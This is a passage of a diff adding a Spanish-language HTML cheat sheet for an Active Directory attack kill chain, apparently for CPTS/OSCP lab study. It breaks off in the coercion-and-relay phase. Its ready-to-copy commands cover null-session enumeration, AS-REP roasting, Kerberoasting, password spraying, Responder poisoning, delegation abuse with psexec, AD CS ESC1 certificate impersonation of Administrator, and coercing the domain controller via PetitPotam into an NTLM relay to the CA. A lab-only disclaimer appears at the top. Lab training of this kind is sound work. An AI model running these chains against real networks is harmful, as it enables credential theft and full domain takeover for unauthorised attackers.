@@ -1,0 +1,838 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#faf9f5;color:#141413}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>Kill Chain de AD</title>
+<style>
+  :root{
+    color-scheme: dark;
+    --bg:#0e1320;
+    --surface:#161d2e;
+    --surface-2:#1d2639;
+    --line:#2a3550;
+    --text:#d6dcea;
+    --muted:#8b97b3;
+    --faint:#647099;
+    --accent:#57cbbd;      /* teal */
+    --accent-dim:#2f6f69;
+    --amber:#e0b24d;        /* phase numbers */
+    --red:#e0798c;          /* con-credenciales / peligro */
+    --green:#7fc98a;        /* enum / seguro */
+    --violet:#a99be0;       /* kerberos */
+    --blue:#7fb3e0;         /* certificados */
+    --mono:'IBM Plex Mono', ui-monospace, 'SF Mono', Menlo, Consolas, monospace;
+    --sans:'IBM Plex Sans', system-ui, -apple-system, Segoe UI, sans-serif;
+  }
+  *{box-sizing:border-box}
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--sans);
+    line-height:1.6;
+    margin:0;
+    -webkit-font-smoothing:antialiased;
+  }
+  .wrap{
+    max-width:1180px;
+    margin:0 auto;
+    padding-inline:20px;
+    display:grid;
+    grid-template-columns:238px 1fr;
+    gap:44px;
+    align-items:start;
+  }
+  header{
+    grid-column:1 / -1;
+    padding-block:40px 26px;
+    border-bottom:1px solid var(--line);
+  }
+  .kicker{
+    font-family:var(--mono);
+    font-size:12px;
+    letter-spacing:.22em;
+    text-transform:uppercase;
+    color:var(--accent);
+    margin:0 0 12px;
+  }
+  h1{
+    font-size:clamp(30px,5vw,46px);
+    line-height:1.05;
+    margin:0 0 14px;
+    font-weight:600;
+    text-wrap:balance;
+    letter-spacing:-.01em;
+  }
+  h1 span{color:var(--accent)}
+  .sub{color:var(--muted);max-width:62ch;margin:0;font-size:15px}
+  .warn{
+    margin-top:20px;
+    font-family:var(--mono);
+    font-size:12.5px;
+    color:var(--faint);
+    border-left:2px solid var(--amber);
+    padding:6px 0 6px 14px;
+    max-width:70ch;
+  }
+  nav{
+    position:sticky;
+    top:calc(env(safe-area-inset-top,0px) + 20px);
+    font-size:13.5px;
+    max-height:calc(100vh - 40px);
+    overflow-y:auto;
+  }
+  nav .navtitle{
+    font-family:var(--mono);
+    font-size:11px;
+    letter-spacing:.18em;
+    text-transform:uppercase;
+    color:var(--faint);
+    margin:0 0 12px;
+  }
+  nav ol{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:2px}
+  nav a{
+    display:flex;
+    gap:10px;
+    color:var(--muted);
+    text-decoration:none;
+    padding:5px 8px;
+    border-radius:6px;
+    border-left:2px solid transparent;
+    transition:background .15s,color .15s;
+  }
+  nav a:hover{background:var(--surface);color:var(--text)}
+  nav a .n{font-family:var(--mono);color:var(--amber);font-size:12px;min-width:18px}
+  main{min-width:0;padding-bottom:80px}
+  section{padding-block:34px;border-bottom:1px solid var(--line)}
+  section:last-child{border-bottom:0}
+  .phase{display:flex;align-items:baseline;gap:16px;margin:0 0 8px}
+  .phase .num{font-family:var(--mono);font-size:14px;color:var(--amber);font-weight:500}
+  h2{font-size:24px;font-weight:600;margin:0;letter-spacing:-.01em;text-wrap:balance}
+  .lead{color:var(--muted);margin:6px 0 22px;max-width:68ch;font-size:14.5px}
+  h3{
+    font-size:15px;
+    font-weight:600;
+    margin:26px 0 10px;
+    color:var(--text);
+    display:flex;
+    align-items:center;
+    gap:10px;
+    flex-wrap:wrap;
+  }
+  h3 .tag{
+    font-family:var(--mono);
+    font-size:10.5px;
+    letter-spacing:.08em;
+    text-transform:uppercase;
+    padding:2px 8px;
+    border-radius:100px;
+    border:1px solid var(--line);
+    color:var(--muted);
+    font-weight:500;
+  }
+  .tag.g{color:var(--green);border-color:var(--accent-dim)}
+  .tag.r{color:var(--red);border-color:#5a3340}
+  .tag.v{color:var(--violet);border-color:#3f3a63}
+  .tag.c{color:var(--blue);border-color:#33506e}
+  p{margin:10px 0}
+  .note{color:var(--muted);font-size:13.5px}
+  ul.tight{margin:8px 0;padding-left:20px;color:var(--muted);font-size:13.5px}
+  ul.tight li{margin:4px 0}
+  ul.tight code, p code, .note code, li code{
+    font-family:var(--mono);
+    font-size:12.5px;
+    background:var(--surface-2);
+    padding:1px 5px;
+    border-radius:4px;
+    color:var(--accent);
+  }
+  .cmd{
+    position:relative;
+    background:var(--surface);
+    border:1px solid var(--line);
+    border-radius:9px;
+    margin:12px 0;
+    overflow:hidden;
+  }
+  .cmd .bar{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:7px 12px;
+    border-bottom:1px solid var(--line);
+    background:var(--surface-2);
+  }
+  .cmd .bar .label{font-family:var(--mono);font-size:11px;letter-spacing:.05em;color:var(--faint)}
+  .cmd button{
+    font-family:var(--mono);
+    font-size:11px;
+    background:transparent;
+    color:var(--muted);
+    border:1px solid var(--line);
+    border-radius:5px;
+    padding:3px 10px;
+    cursor:pointer;
+    transition:.15s;
+    white-space:nowrap;
+  }
+  .cmd button:hover{color:var(--accent);border-color:var(--accent-dim)}
+  .cmd button.ok{color:var(--green);border-color:var(--accent-dim)}
+  .cmd pre{
+    margin:0;
+    padding:14px 16px;
+    overflow-x:auto;
+    font-family:var(--mono);
+    font-size:12.7px;
+    line-height:1.7;
+    color:var(--text);
+  }
+  .cmd pre .c{color:var(--faint)}
+  .cmd pre .p{color:var(--accent)}
+  .cmd pre .v{color:var(--amber)}
+  .cmd:focus-within{border-color:var(--accent-dim)}
+  .tip{
+    border:1px solid var(--line);
+    border-left:3px solid var(--accent);
+    background:var(--surface);
+    border-radius:8px;
+    padding:12px 16px;
+    margin:16px 0;
+    font-size:13.5px;
+    color:var(--muted);
+  }
+  .tip b{color:var(--text);font-weight:600}
+  .tip.amber{border-left-color:var(--amber)}
+  .tip.red{border-left-color:var(--red)}
+  .tip.blue{border-left-color:var(--blue)}
+  footer{
+    grid-column:1 / -1;
+    padding:26px 0 40px;
+    color:var(--faint);
+    font-size:12.5px;
+    font-family:var(--mono);
+    border-top:1px solid var(--line);
+  }
+  .fork{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:18px 0}
+  .fork .card{background:var(--surface);border:1px solid var(--line);border-radius:9px;padding:14px 16px}
+  .fork .card h4{margin:0 0 6px;font-size:13px;font-family:var(--mono);letter-spacing:.05em;text-transform:uppercase}
+  .fork .card.q h4{color:var(--green)}
+  .fork .card.a h4{color:var(--red)}
+  .fork .card p{margin:0;font-size:13px;color:var(--muted)}
+  /* tabla ESC */
+  .esc{
+    width:100%;
+    border-collapse:collapse;
+    margin:12px 0;
+    font-size:13px;
+  }
+  .esc th,.esc td{
+    text-align:left;
+    padding:9px 12px;
+    border-bottom:1px solid var(--line);
+    vertical-align:top;
+  }
+  .esc th{
+    font-family:var(--mono);
+    font-size:11px;
+    letter-spacing:.06em;
+    text-transform:uppercase;
+    color:var(--faint);
+    font-weight:500;
+  }
+  .esc td:first-child{font-family:var(--mono);color:var(--blue);white-space:nowrap}
+  .esc td{color:var(--muted)}
+  .esc-wrap{overflow-x:auto}
+  @media (max-width:840px){
+    .wrap{grid-template-columns:1fr;gap:0}
+    nav{display:none}
+    .fork{grid-template-columns:1fr}
+  }
+</style>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500&display=swap">
+
+<div class="wrap">
+  <header>
+    <p class="kicker">Pentesting · Metodología CPTS / OSCP</p>
+    <h1>Kill chain de <span>Active Directory</span></h1>
+    <p class="sub">Procedimiento de ataque ordenado por fases: desde el reconocimiento sin nada hasta la escalada de dominio, los abusos de AD CS y trusts, la post-explotación y la persistencia. Comandos listos para copiar.</p>
+    <p class="warn">Uso exclusivo en laboratorios propios (HTB, entornos autorizados). Atacar sistemas sin permiso escrito es ilegal.</p>
+  </header>
+
+  <nav>
+    <p class="navtitle">Fases</p>
+    <ol>
+      <li><a href="#f0"><span class="n">00</span> Modelo mental</a></li>
+      <li><a href="#f1"><span class="n">01</span> Recon externo</a></li>
+      <li><a href="#f2"><span class="n">02</span> Sin credenciales</a></li>
+      <li><a href="#f3"><span class="n">03</span> Con credenciales</a></li>
+      <li><a href="#f4"><span class="n">04</span> BloodHound</a></li>
+      <li><a href="#f5"><span class="n">05</span> Ataques Kerberos</a></li>
+      <li><a href="#f6"><span class="n">06</span> AD CS (ESC)</a></li>
+      <li><a href="#f7"><span class="n">07</span> Coerción + Relay</a></li>
+      <li><a href="#f8"><span class="n">08</span> Abuso de servicios</a></li>
+      <li><a href="#f9"><span class="n">09</span> Movimiento lateral</a></li>
+      <li><a href="#f10"><span class="n">10</span> Escalada de dominio</a></li>
+      <li><a href="#f11"><span class="n">11</span> Trusts</a></li>
+      <li><a href="#f12"><span class="n">12</span> Post-explotación</a></li>
+      <li><a href="#f13"><span class="n">13</span> Persistencia</a></li>
+      <li><a href="#f14"><span class="n">14</span> Chuleta rápida</a></li>
+    </ol>
+  </nav>
+
+  <main>
+
+    <!-- 00 -->
+    <section id="f0">
+      <div class="phase"><span class="num">00</span><h2>Modelo mental del ataque</h2></div>
+      <p class="lead">Casi todo engagement de AD sigue el mismo bucle: consigues un punto de apoyo, enumeras, encuentras una credencial o un camino, te mueves lateralmente y repites hasta llegar a Domain Admin. La pregunta que gobierna cada paso es siempre la misma.</p>
+      <div class="fork">
+        <div class="card q"><h4>¿Tengo credenciales?</h4><p>No → acceso no autenticado: usuarios anónimos, AS-REP roasting, coerción/poisoning de red, password spraying.</p></div>
+        <div class="card a"><h4>Sí, tengo credenciales</h4><p>Enumera con contexto: BloodHound, SPNs, shares, ACLs, plantillas de certificado. Busca el camino más corto a un objeto privilegiado.</p></div>
+      </div>
+      <div class="tip"><b>El bucle:</b> Foothold → Enumerar (usuarios, grupos, ACLs, SPNs, AD CS) → Obtener credencial/hash/ticket → Validar dónde vale (NetExec) → Moverse → Volver a enumerar como el nuevo principal. Documenta cada credencial con dónde funciona y con qué privilegios.</div>
+      <div class="tip amber"><b>Variables usadas en esta guía:</b> <code>$DC</code> IP del Domain Controller · <code>$DOMAIN</code> dominio (ej. <code>corp.local</code>) · <code>$USER</code> / <code>$PASS</code> credencial · <code>$HASH</code> hash NTLM · <code>$TARGET</code> host objetivo · <code>$ATACANTE</code> tu IP.</div>
+    </section>
+
+    <!-- 01 -->
+    <section id="f1">
+      <div class="phase"><span class="num">01</span><h2>Reconocimiento e identificación</h2></div>
+      <p class="lead">Localiza el Domain Controller y mapea servicios. El DC casi siempre tiene 88 (Kerberos), 389/636 (LDAP), 445 (SMB) y 53 (DNS) abiertos a la vez.</p>
+
+      <h3>Escaneo inicial <span class="tag g">no auth</span></h3>
+      <div class="cmd" data-code="nmap -Pn -p- --min-rate 3000 -oA scan_full $TARGET
+nmap -Pn -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -oA scan_ad $TARGET">
+        <div class="bar"><span class="label">bash · descubrimiento de puertos</span><button>copiar</button></div>
+        <pre><span class="p">nmap</span> -Pn -p- --min-rate 3000 -oA scan_full <span class="v">$TARGET</span>
+<span class="c"># Puertos típicos de un DC en un solo barrido:</span>
+<span class="p">nmap</span> -Pn -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -oA scan_ad <span class="v">$TARGET</span></pre>
+      </div>
+
+      <h3>Identificar dominio y nombre del DC <span class="tag g">no auth</span></h3>
+      <div class="cmd" data-code="nmap -Pn -p 389 --script ldap-rootdse $DC
+crackmapexec smb $DC
+netexec smb $DC
+enum4linux-ng -A $DC">
+        <div class="bar"><span class="label">bash · fingerprint del dominio</span><button>copiar</button></div>
+        <pre><span class="c"># El rootDSE de LDAP revela el nombre del dominio sin autenticar</span>
+<span class="p">nmap</span> -Pn -p 389 --script ldap-rootdse <span class="v">$DC</span>
+<span class="c"># CME/NetExec muestran hostname, dominio, SMB signing y versión de SO</span>
+<span class="p">crackmapexec</span> smb <span class="v">$DC</span>
+<span class="p">netexec</span> smb <span class="v">$DC</span>
+<span class="p">enum4linux-ng</span> -A <span class="v">$DC</span></pre>
+      </div>
+      <div class="tip"><b>Fija el DNS y el reloj.</b> Añade el dominio a <code>/etc/hosts</code> y usa el DC como resolutor. Kerberos falla si el nombre del DC no resuelve o el reloj está desfasado: sincroniza con <code>sudo ntpdate $DC</code> o <code>faketime</code>.</div>
+    </section>
+
+    <!-- 02 -->
+    <section id="f2">
+      <div class="phase"><span class="num">02</span><h2>Sin credenciales</h2></div>
+      <p class="lead">Objetivo: conseguir el primer usuario/hash sin tener nada. Vías: sesiones anónimas, AS-REP roasting, coerción/poisoning y password spraying.</p>
+
+      <h3>Sesiones nulas y anónimas <span class="tag g">no auth</span></h3>
+      <div class="cmd" data-code="netexec smb $DC -u '' -p '' --shares
+netexec smb $DC -u 'guest' -p '' --users
+rpcclient -U '' -N $DC
+#   enumdomusers / querydispinfo / enumdomgroups
+ldapsearch -x -H ldap://$DC -b 'DC=corp,DC=local'">
+        <div class="bar"><span class="label">bash · acceso anónimo SMB/RPC/LDAP</span><button>copiar</button></div>
+        <pre><span class="c"># ¿Shares o usuarios legibles sin credenciales?</span>
+<span class="p">netexec</span> smb <span class="v">$DC</span> -u '' -p '' --shares
+<span class="p">netexec</span> smb <span class="v">$DC</span> -u 'guest' -p '' --users
+<span class="c"># RPC nulo: enumerar usuarios y grupos</span>
+<span class="p">rpcclient</span> -U '' -N <span class="v">$DC</span>
+<span class="c">#   enumdomusers | querydispinfo | enumdomgroups</span>
+<span class="c"># LDAP anónimo (a veces permitido)</span>
+<span class="p">ldapsearch</span> -x -H ldap://<span class="v">$DC</span> -b 'DC=corp,DC=local'</pre>
+      </div>
+
+      <h3>Construir lista de usuarios + validarla <span class="tag g">no auth</span></h3>
+      <div class="cmd" data-code="kerbrute userenum -d $DOMAIN --dc $DC users.txt
+# formatos: jsmith / j.smith / john.smith / smithj ...">
+        <div class="bar"><span class="label">bash · enumeración vía Kerberos</span><button>copiar</button></div>
+        <pre><span class="c"># kerbrute valida usuarios sin bloquear cuentas (pre-auth AS-REQ)</span>
+<span class="p">kerbrute</span> userenum -d <span class="v">$DOMAIN</span> --dc <span class="v">$DC</span> users.txt
+<span class="c"># Formatos habituales: jsmith / j.smith / john.smith / smithj</span></pre>
+      </div>
+
+      <h3>AS-REP Roasting <span class="tag v">kerberos</span> <span class="tag g">no auth</span></h3>
+      <p class="note">Usuarios con "no requiere pre-autenticación" entregan un hash crackeable sin credenciales.</p>
+      <div class="cmd" data-code="impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC -no-pass -format hashcat -outputfile asrep.hash
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt">
+        <div class="bar"><span class="label">bash · GetNPUsers + hashcat</span><button>copiar</button></div>
+        <pre><span class="p">impacket-GetNPUsers</span> <span class="v">$DOMAIN</span>/ -usersfile users.txt -dc-ip <span class="v">$DC</span> \
+  -no-pass -format hashcat -outputfile asrep.hash
+<span class="c"># Modo 18200 = AS-REP</span>
+<span class="p">hashcat</span> -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt</pre>
+      </div>
+
+      <h3>Password spraying <span class="tag g">no auth</span></h3>
+      <div class="cmd" data-code="netexec smb $DC -u users.txt -p 'Primavera2026!' --continue-on-success
+kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Welcome1'">
+        <div class="bar"><span class="label">bash · una contraseña, muchos usuarios</span><button>copiar</button></div>
+        <pre><span class="c"># UNA contraseña plausible contra TODOS los usuarios</span>
+<span class="p">netexec</span> smb <span class="v">$DC</span> -u users.txt -p 'Primavera2026!' --continue-on-success
+<span class="p">kerbrute</span> passwordspray -d <span class="v">$DOMAIN</span> --dc <span class="v">$DC</span> users.txt 'Welcome1'</pre>
+      </div>
+      <div class="tip red"><b>Cuidado con la política de bloqueo.</b> Comprueba antes de rociar: <code>netexec smb $DC -u '' -p '' --pass-pol</code>. Deja margen bajo el umbral y espera la ventana de reset.</div>
+
+      <h3>Poisoning LLMNR/NBT-NS (si estás en la LAN) <span class="tag g">no auth</span></h3>
+      <div class="cmd" data-code="sudo responder -I eth0 -wd
+# captura NetNTLMv2 -> hashcat -m 5600
+# (para relay y coerción -> fase 07)">
+        <div class="bar"><span class="label">bash · Responder</span><button>copiar</button></div>
+        <pre><span class="c"># Captura NetNTLMv2 de broadcast LLMNR/NBT-NS/mDNS</span>
+<span class="p">sudo responder</span> -I eth0 -wd
+<span class="c"># Crackea con hashcat -m 5600. Para relay y coerción -> fase 07</span></pre>
+      </div>
+    </section>
+
+    <!-- 03 -->
+    <section id="f3">
+      <div class="phase"><span class="num">03</span><h2>Con credenciales</h2></div>
+      <p class="lead">Ya tienes un usuario válido. Enumeras el dominio con contexto y buscas el siguiente salto. Primero valida <em>dónde</em> vale esa credencial.</p>
+
+      <h3>Validar la credencial en toda la red <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="netexec smb 10.10.10.0/24 -u $USER -p $PASS
+netexec winrm 10.10.10.0/24 -u $USER -p $PASS
+netexec smb $DC -u $USER -p $PASS --users --groups --shares --pass-pol">
+        <div class="bar"><span class="label">bash · barrido de credenciales</span><button>copiar</button></div>
+        <pre><span class="c"># ¿Dónde autentica? ¿Dónde soy admin local? (busca 'Pwn3d!')</span>
+<span class="p">netexec</span> smb 10.10.10.0/24 -u <span class="v">$USER</span> -p <span class="v">$PASS</span>
+<span class="p">netexec</span> winrm 10.10.10.0/24 -u <span class="v">$USER</span> -p <span class="v">$PASS</span>
+<span class="p">netexec</span> smb <span class="v">$DC</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> --users --groups --shares --pass-pol</pre>
+      </div>
+
+      <h3>Enumeración LDAP/RPC autenticada <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="ldapdomaindump -u \"$DOMAIN\\\\$USER\" -p $PASS $DC
+netexec ldap $DC -u $USER -p $PASS --trusted-for-delegation
+netexec smb $DC -u $USER -p $PASS -M spider_plus">
+        <div class="bar"><span class="label">bash · volcado LDAP y descubrimiento</span><button>copiar</button></div>
+        <pre><span class="c"># Volcado HTML/JSON de usuarios, grupos, equipos, políticas</span>
+<span class="p">ldapdomaindump</span> -u "<span class="v">$DOMAIN</span>\<span class="v">$USER</span>" -p <span class="v">$PASS</span> <span class="v">$DC</span>
+<span class="c"># Cuentas con delegación (objetivo goloso)</span>
+<span class="p">netexec</span> ldap <span class="v">$DC</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> --trusted-for-delegation
+<span class="c"># Rebuscar credenciales en shares legibles</span>
+<span class="p">netexec</span> smb <span class="v">$DC</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> -M spider_plus</pre>
+      </div>
+      <div class="tip"><b>Pass-the-Hash.</b> En casi toda herramienta de Impacket/NetExec cambia <code>-p $PASS</code> por <code>-H $HASH</code>. Con el hash NTLM no necesitas la contraseña en claro.</div>
+    </section>
+
+    <!-- 04 -->
+    <section id="f4">
+      <div class="phase"><span class="num">04</span><h2>BloodHound: el mapa del dominio</h2></div>
+      <p class="lead">Con cualquier credencial válida, recolecta el grafo de relaciones: ACLs, sesiones, delegaciones, membresías anidadas. Revela caminos que a mano no verías.</p>
+
+      <h3>Recolección <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c All --zip
+netexec ldap $DC -u $USER -p $PASS --bloodhound --collection All --dns-server $DC">
+        <div class="bar"><span class="label">bash · ingesta remota</span><button>copiar</button></div>
+        <pre><span class="p">bloodhound-python</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> -d <span class="v">$DOMAIN</span> -ns <span class="v">$DC</span> -c All --zip
+<span class="c"># o vía NetExec:</span>
+<span class="p">netexec</span> ldap <span class="v">$DC</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> --bloodhound --collection All --dns-server <span class="v">$DC</span></pre>
+      </div>
+      <ul class="tight">
+        <li><b>Shortest paths to Domain Admins</b> — el camino más corto desde tu usuario.</li>
+        <li><b>Kerberoastable</b> y <b>AS-REP roastable users</b> — objetivos de la fase 05.</li>
+        <li><b>Principals with DCSync rights</b> — atajo directo a todos los hashes.</li>
+        <li>ACLs abusables: <code>GenericAll</code>, <code>GenericWrite</code>, <code>WriteDACL</code>, <code>ForceChangePassword</code>, <code>AddMember</code>.</li>
+      </ul>
+      <div class="tip amber"><b>Abuso de ACL típico.</b> ¿<code>ForceChangePassword</code> sobre un usuario? Cámbiale la clave con <code>net rpc password</code> o <code>bloodyAD</code>. ¿<code>GenericAll</code> sobre un grupo? Añádete con <code>bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember "GRUPO" $USER</code>.</div>
+    </section>
+
+    <!-- 05 -->
+    <section id="f5">
+      <div class="phase"><span class="num">05</span><h2>Ataques Kerberos</h2></div>
+      <p class="lead">Con un usuario del dominio autenticado, Kerberos ofrece Kerberoasting sobre cuentas de servicio y abuso de delegaciones.</p>
+
+      <h3>Kerberoasting <span class="tag v">kerberos</span> <span class="tag r">auth</span></h3>
+      <p class="note">Cualquier usuario pide tickets de servicio (TGS) de cuentas con SPN. El ticket va cifrado con el hash de la cuenta → crackeable offline. Suelen tener claves débiles y muchos privilegios.</p>
+      <div class="cmd" data-code="impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerb.hash
+hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt">
+        <div class="bar"><span class="label">bash · GetUserSPNs + hashcat</span><button>copiar</button></div>
+        <pre><span class="p">impacket-GetUserSPNs</span> <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span> -dc-ip <span class="v">$DC</span> \
+  -request -outputfile kerb.hash
+<span class="c"># Modo 13100 = TGS-REP (RC4)</span>
+<span class="p">hashcat</span> -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt</pre>
+      </div>
+
+      <h3>Delegaciones <span class="tag v">kerberos</span> <span class="tag r">auth</span></h3>
+      <ul class="tight">
+        <li><b>Unconstrained:</b> host que guarda TGTs; captura el del DC → dominio comprometido.</li>
+        <li><b>Constrained (S4U):</b> suplanta a cualquier usuario contra el servicio permitido.</li>
+        <li><b>RBCD:</b> con <code>WriteProperty</code> sobre un equipo, configuras delegación entrante y suplantas.</li>
+      </ul>
+      <div class="cmd" data-code="# Constrained delegation (S4U)
+impacket-getST -spn cifs/$TARGET -impersonate Administrator $DOMAIN/$USER:$PASS -dc-ip $DC
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass $DOMAIN/Administrator@$TARGET">
+        <div class="bar"><span class="label">bash · abuso S4U</span><button>copiar</button></div>
+        <pre><span class="c"># Pide un ticket suplantando a Administrator hacia el servicio objetivo</span>
+<span class="p">impacket-getST</span> -spn cifs/<span class="v">$TARGET</span> -impersonate Administrator \
+  <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span> -dc-ip <span class="v">$DC</span>
+<span class="p">export</span> KRB5CCNAME=Administrator.ccache
+<span class="p">impacket-psexec</span> -k -no-pass <span class="v">$DOMAIN</span>/Administrator@<span class="v">$TARGET</span></pre>
+      </div>
+      <div class="tip amber"><b>RBCD en corto.</b> Crea un equipo (<code>impacket-addcomputer</code>), asígnale delegación entrante sobre el objetivo con <code>rbcd.py</code> o <code>bloodyAD ... set rbcd</code>, y pide un ST con <code>getST -spn cifs/$TARGET -impersonate Administrator</code>.</div>
+    </section>
+
+    <!-- 06 AD CS -->
+    <section id="f6">
+      <div class="phase"><span class="num">06</span><h2>AD CS: abuso de certificados</h2></div>
+      <p class="lead">Los Servicios de Certificados de AD son hoy uno de los caminos más rápidos a Domain Admin. Certipy enumera y explota plantillas mal configuradas (ESC1–ESC8). Un certificado permite autenticarte como el usuario que representa, y sobrevive a cambios de contraseña.</p>
+
+      <h3>Enumerar la CA y plantillas vulnerables <span class="tag c">cert</span> <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout
+# genera también .json/.txt con toda la superficie de AD CS">
+        <div class="bar"><span class="label">bash · certipy find</span><button>copiar</button></div>
+        <pre><span class="c"># Lista CA, plantillas y marca las vulnerables (ESCx)</span>
+<span class="p">certipy</span> find -u <span class="v">$USER</span>@<span class="v">$DOMAIN</span> -p <span class="v">$PASS</span> -dc-ip <span class="v">$DC</span> -vulnerable -stdout</pre>
+      </div>
+
+      <div class="esc-wrap">
+        <table class="esc">
+          <thead><tr><th>ID</th><th>Configuración vulnerable</th><th>Abuso</th></tr></thead>
+          <tbody>
+            <tr><td>ESC1</td><td>Plantilla permite indicar SAN + auth de cliente, usuarios pueden inscribirse</td><td>Pides cert como cualquier usuario (incl. DA)</td></tr>
+            <tr><td>ESC2</td><td>Plantilla con EKU "Any Purpose" o sin EKU</td><td>Cert usable para cualquier fin, incl. auth</td></tr>
+            <tr><td>ESC3</td><td>Plantilla de agente de inscripción (Enrollment Agent)</td><td>Solicitas certs en nombre de otros</td></tr>
+            <tr><td>ESC4</td><td>Tienes control (ACL) sobre la plantilla</td><td>La reescribes para hacerla ESC1 y luego la explotas</td></tr>
+            <tr><td>ESC6</td><td>CA con flag EDITF_ATTRIBUTESUBJECTALTNAME2</td><td>SAN arbitrario en cualquier petición</td></tr>
+            <tr><td>ESC7</td><td>Control sobre la propia CA (ManageCA/ManageCertificates)</td><td>Apruebas peticiones / habilitas ESC6</td></tr>
+            <tr><td>ESC8</td><td>Endpoint web de inscripción (HTTP) sin protección</td><td>Relay NTLM del DC a la CA (ver fase 07)</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>ESC1 de principio a fin <span class="tag c">cert</span> <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="# 1) Pide un cert suplantando a un DA vía SAN
+certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CORP-CA' -template 'VulnTemplate' -upn Administrator@$DOMAIN
+# 2) Autentica con el .pfx -> obtienes TGT y el hash NT
+certipy auth -pfx administrator.pfx -dc-ip $DC">
+        <div class="bar"><span class="label">bash · certipy req + auth</span><button>copiar</button></div>
+        <pre><span class="c"># 1) Solicitar certificado con SAN = Administrator</span>
+<span class="p">certipy</span> req -u <span class="v">$USER</span>@<span class="v">$DOMAIN</span> -p <span class="v">$PASS</span> -dc-ip <span class="v">$DC</span> \
+  -ca 'CORP-CA' -template 'VulnTemplate' -upn Administrator@<span class="v">$DOMAIN</span>
+<span class="c"># 2) Autenticarse con el .pfx -> TGT + hash NT del DA</span>
+<span class="p">certipy</span> auth -pfx administrator.pfx -dc-ip <span class="v">$DC</span></pre>
+      </div>
+      <div class="tip blue"><b>El resultado.</b> <code>certipy auth</code> te devuelve un TGT (<code>.ccache</code>) y el hash NT. Con eso saltas a la fase 09 (movimiento lateral) o directamente a DCSync (fase 10). ESC4 → primero <code>certipy template</code> para volverla vulnerable; ESC6/ESC8 combinan con coerción (fase 07).</div>
+    </section>
+
+    <!-- 07 coerción + relay -->
+    <section id="f7">
+      <div class="phase"><span class="num">07</span><h2>Coerción y NTLM relay</h2></div>
+      <p class="lead">Forzar a una máquina (incluido el DC) a autenticarse contra ti, y reenviar (relay) esa autenticación a un servicio que no valida firma. La cadena estrella hoy: coaccionar al DC y hacer relay a AD CS (ESC8) para obtener un certificado del propio DC.</p>
+
+      <h3>Forzar autenticación del DC <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="# PetitPotam (MS-EFSR), a menudo sin credenciales
+petitpotam.py -u $USER -p $PASS $ATACANTE $DC
+# Coercer prueba múltiples métodos (EFS, DFS, spooler...)
+coercer coerce -u $USER -p $PASS -t $DC -l $ATACANTE
+# PrinterBug (MS-RPRN)
+printerbug.py $DOMAIN/$USER:$PASS@$DC $ATACANTE">
+        <div class="bar"><span class="label">bash · coerción</span><button>copiar</button></div>
+        <pre><span class="p">petitpotam.py</span> -u <span class="v">$USER</span> -p <span class="v">$PASS</span> <span class="v">$ATACANTE</span> <span class="v">$DC</span>
+<span class="p">coercer</span> coerce -u <span class="v">$USER</span> -p <span class="v">$PASS</span> -t <span class="v">$DC</span> -l <span class="v">$ATACANTE</span>
+<span class="p">printerbug.py</span> <span class="v">$DOMAIN</span>/<span class="v">$USER</span>:<span class="v">$PASS</span>@<span class="v">$DC</span> <span class="v">$ATACANTE</span></pre>
+      </div>
+
+      <h3>Cadena ESC8: relay del DC a AD CS <span class="tag c">cert</span> <span class="tag r">auth</span></h3>
+      <div class="cmd" data-code="# 1) Escucha el relay apuntando al endpoint web de la CA
+impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# 2) En otra terminal, coacciona al DC contra tu IP
+petitpotam.py -u $USER -p $PASS $ATACANTE $DC
+# 3) ntlmrelayx captura un cert del DC -> auténticate con certipy
+certipy auth -pfx dc.pfx -dc-ip $DC   # -> hash NT del DC$ -> DCSync">
+        <div class="bar"><span class="label">bash · ntlmrelayx --adcs (ESC8)</span><button>copiar</button></div>
+        <pre><span class="c"># 1) Relay hacia el endpoint web de la CA</span>
+<span class="p">impacket-ntlmrelayx</span> -t http://CA/certsrv/certfnsh.asp -smb2support \
+  --adcs --template DomainController
+<span class="c"># 2) Coacciona al DC contra tu IP (otra terminal)</span>
